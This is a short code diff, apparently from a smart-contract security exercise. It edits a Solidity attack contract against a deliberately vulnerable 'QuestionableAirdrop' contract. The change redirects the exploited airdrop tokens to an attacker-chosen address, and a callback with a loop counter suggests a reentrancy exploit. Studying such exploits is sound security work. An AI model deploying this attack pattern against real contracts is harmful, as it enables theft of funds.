@@ -10,6 +10,7 @@ interface IAirdropReceiver {
 }
 
 contract QuestionableAirdrop {
+    
     mapping (address => uint256) private userBalances;
     mapping (address => bool) private receivedAirdrops;
 
@@ -65,10 +66,10 @@ contract QuestionableAirdropAttack {
     QuestionableAirdrop ins;
     uint loop;
 
-    function attack(address _target) external {
+    function attack(address _target,address _newOwner) external {
         ins = QuestionableAirdrop(_target);
         ins.receiveAirdrop(address(this));
-        ins.transferAirdrop(msg.sender);
+        ins.transferAirdrop(_newOwner);
     }
 
     function canReceiveAirdrop() external returns (bool) {
